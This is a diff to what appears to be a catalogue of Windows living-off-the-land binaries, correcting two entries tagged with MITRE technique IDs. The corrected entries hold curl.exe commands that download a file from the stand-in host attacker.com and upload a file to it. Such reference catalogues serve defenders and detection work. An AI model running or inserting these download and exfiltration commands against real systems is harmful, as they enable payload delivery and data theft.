@@ -11,7 +11,7 @@ Commands:
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows 10, Windows 11
-  - Command: certutil.exe http://attacker.com/file.exe --output file.exe
+  - Command: curl.exe http://attacker.com/file.exe --output file.exe
     Description: Download and save file.exe to disk in the current folder.
     Usecase: Download file from Internet.
     Category: Download
@@ -25,7 +25,7 @@ Commands:
     Privileges: User
     MitreID: T1567
     OperatingSystem: Windows 10, Windows 11
-  - Command: certutil.exe http://attacker.com/upload --upload-file file.exe
+  - Command: curl.exe http://attacker.com/upload --upload-file file.exe
     Description: Upload file to destination.
     Usecase: Upload file to destination
     Category: Upload
